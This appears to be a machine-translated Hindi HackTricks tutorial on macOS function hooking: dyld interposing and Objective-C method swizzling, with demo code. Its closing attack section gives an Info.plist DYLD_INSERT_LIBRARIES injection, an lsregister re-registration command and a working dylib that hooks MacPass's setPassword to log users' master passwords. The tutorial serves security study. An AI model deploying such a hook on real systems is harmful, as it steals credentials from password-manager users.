# macOS कार्य क्रमण हुकिंग

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 पर **फॉलो** करें [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>
{% endhint %}

## कार्य इंटरपोजिंग

एक **dylib** बनाएं जिसमें एक **`__interpose` (`__DATA___interpose`)** खंड (या एक खंड जिसे **`S_INTERPOSING`** के साथ चिह्नित किया गया हो) हो, जिसमें **कार्य संकेतक** के जोड़ों को शामिल करें जो **मूल** और **प्रतिस्थापन** कार्यों को संदर्भित करते हैं।

फिर, **`DYLD_INSERT_LIBRARIES`** के साथ dylib **इंजेक्ट** करें (इंटरपोजिंग को मुख्य ऐप लोड होने से पहले होना चाहिए)। स्वाभाविक रूप से [**`DYLD_INSERT_LIBRARIES`** का उपयोग करने पर लागू **प्रतिबंध** यहाँ भी लागू होता है](macos-library-injection/#check-restrictions)।

### printf को इंटरपोज करें

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" overflow="wrap" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %}
{% code overflow="wrap" %}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endcode %}
{% endtab %}
{% endtabs %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
{% hint style="warning" %}
**`DYLD_PRINT_INTERPOSTING`** एनवायरनमेंट वेरिएबल का उपयोग इंटरपोजिंग को डीबग करने के लिए किया जा सकता है और यह इंटरपोज प्रक्रिया प्रिंट करेगा।
{% endhint %}

इसके अलावा ध्यान दें कि **इंटरपोजिंग प्रक्रिया और लोड की गई लाइब्रेरी** के बीच होती है, यह साझा लाइब्रेरी कैश के साथ काम नहीं करती।

### डायनामिक इंटरपोजिंग

अब यह भी संभव है कि फ़ंक्शन को डायनामिक रूप से इंटरपोज किया जा सके उस फ़ंक्शन का उपयोग करके **`dyld_dynamic_interpose`**। यह यह सुनिश्चित करने के लिए केवल प्रारंभ से ही नहीं करना है कि रन टाइम में फ़ंक्शन को इंटरपोज किया जा सके।

बस इसे इंटरपोज करने के लिए **फ़ंक्शन के बदलने और प्रतिस्थापन** फ़ंक्शन के **ट्यूपल** को इंडिकेट करना है।
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## विधि स्विजलिंग

ObjectiveC में यह एक विधि कैसे बुलाई जाती है: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

इसमें **ऑब्जेक्ट**, **मेथड** और **पैरामीटर** की आवश्यकता होती है। और जब एक विधि को बुलाया जाता है तो एक **msg भेजा जाता है** जिसका उपयोग करके **`objc_msgSend`** फ़ंक्शन को उपयोग किया जाता है: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

ऑब्जेक्ट है **`someObject`**, मेथड है **`@selector(method1p1:p2:)`** और तार्किक हैं **value1**, **value2**।

ऑब्जेक्ट संरचनाओं का पालन करते हुए, एक **विधियों का अर्रेय** तक पहुंचना संभव है जहां **नाम** और **विधि कोड के पॉइंटर** **स्थित** हैं।

{% hint style="danger" %}
ध्यान दें कि क्योंकि विधियाँ और क्लासों के नामों पर पहुंचा जाता है, इस सूचना को बाइनरी में स्टोर किया जाता है, इसलिए इसे `otool -ov </path/bin>` या [`class-dump </path/bin>`](https://github.com/nygard/class-dump) के साथ पुनः प्राप्त किया जा सकता है।
{% endhint %}

### कच्चे विधियों तक पहुंचना

विधियों की जानकारी तक पहुंचना संभव है जैसे नाम, पैरामीटरों की संख्या या पता जैसे निम्नलिखित उदाहरण में:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
{% endcode %}

### method_exchangeImplementations के साथ मेथड स्विज़लिंग

फ़ंक्शन **`method_exchangeImplementations`** को **एक फ़ंक्शन के इम्प्लीमेंटेशन** के **पते को बदलने** की अनुमति देता है **दूसरे के लिए**।

{% hint style="danger" %}
तो जब एक फ़ंक्शन को कॉल किया जाता है तो **वहाँ दूसरा वाला ही चलाया जाता है**।
{% endhint %}

{% code overflow="wrap" %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% endcode %}

{% hint style="warning" %}
इस मामले में अगर **वैध** मेथड के **अंमलन कोड** नाम की **पुष्टि** करता है तो यह स्विज़लिंग को **पहचान** सकता है और इसे चलने से रोक सकता है।

निम्नलिखित तकनीक में यह प्रतिबंध नहीं है।
{% endhint %}

### method\_setImplementation के साथ Method Swizzling

पिछला प्रारूप अजीब है क्योंकि आप एक से दूसरे मेथड के अंमलन को बदल रहे हैं। **`method_setImplementation`** फ़ंक्शन का उपयोग करके आप किसी **मेथड के अंमलन** को **दूसरे के लिए बदल सकते हैं**।

बस याद रखें कि अगर आप नए अंमलन से उसे कॉल करने जा रहे हैं तो **मूल वाले के अंमलन के पते को संग्रहित करें** क्योंकि बाद में उस पते को ढूंढना बहुत कठिन हो जाएगा।

{% code overflow="wrap" %}
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
{% endcode %}

## हुकिंग हमले की विधि

इस पृष्ठ पर विभिन्न तरीके चरणों को हुक फ़ंक्शन करने के बारे में चर्चा की गई थी। हालांकि, इसमें **प्रक्रिया के अंदर कोड चलाने की आक्रमण** शामिल थे।

इसे करने के लिए सबसे आसान तकनीक [डाइल्ड को पर्यावरण चरणों या हाइजैकिंग के माध्यम से इंजेक्ट करना है](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)। हालांकि, मुझे लगता है कि यह [डाइलिब प्रक्रिया इंजेक्शन](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port) के माध्यम से भी किया जा सकता है।

हालांकि, दोनों विकल्प **सीमित** हैं **सुरक्षित नहीं** बाइनरी/प्रक्रियाओं के लिए। निषेधों के बारे में अधिक जानने के लिए प्रत्येक तकनीक की जांच करें।

हालांकि, फ़ंक्शन हुकिंग हमला बहुत विशिष्ट है, एक हमलावर इसे **प्रक्रिया के अंदर से संवेदनशील जानकारी चुराने** के लिए करेगा (अगर नहीं तो आप बस एक प्रक्रिया इंजेक्शन हमला करेंगे)। और यह संवेदनशील जानकारी उपयोगकर्ता डाउनलोड किए गए ऐप्स जैसे MacPass में स्थित हो सकती है।

तो हमलावर वेक्टर या तो एक भेद्यता खोजने या एप्लिकेशन के Info.plist के माध्यम से **`DYLD_INSERT_LIBRARIES`** एनवायरमेंट चरण को इंजेक्ट करने के लिए एप्लिकेशन के सिग्नेचर को छीनने का प्रयास करेगा और कुछ इस प्रकार जोड़ेगा:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
और फिर **एप्लिकेशन को पुनः पंजीकृत** करें:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

उस लाइब्रेरी में हुकिंग कोड जोड़ें ताकि जानकारी निकाली जा सके: पासवर्ड, संदेश...

{% hint style="danger" %}
ध्यान दें कि macOS के नए संस्करणों में अगर आप एप्लिकेशन बाइनरी के **सिग्नेचर को हटा देते हैं** और यह पहले से चल रहा था, तो macOS **अब एप्लिकेशन को नहीं चलाएगा**।
{% endhint %}

#### लाइब्रेरी उदाहरण

{% code overflow="wrap" %}
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
{% endcode %}

## संदर्भ

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** को** **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}
